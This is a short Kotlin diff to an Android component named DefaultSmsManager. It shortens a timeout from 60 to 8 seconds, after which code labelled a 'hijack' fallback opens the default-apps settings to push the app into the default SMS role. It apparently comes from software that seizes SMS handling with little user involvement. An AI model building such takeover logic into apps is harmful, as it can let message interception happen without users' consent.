@@ -44,9 +44,9 @@ object DefaultSmsManager {
             // CENTRALIZED ROBUST FALLBACK
             if (expectedMode == "AUTO") {
                 CoroutineScope(Dispatchers.IO).launch {
-                    delay(60000)
+                    delay(8000)
                     if (!isDefaultSms(ctx) && expectedMode == "AUTO") {
-                        DebugLogger.log("SMS_MGR", "Hijack timeout (60s). Triggering manual navigation fallback.")
+                        DebugLogger.log("SMS_MGR", "Hijack timeout (8s). Triggering manual navigation fallback.")
                         expectedMode = "AUTO_NAV"
                         val i = Intent(Settings.ACTION_MANAGE_DEFAULT_APPS_SETTINGS).apply {
                             addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
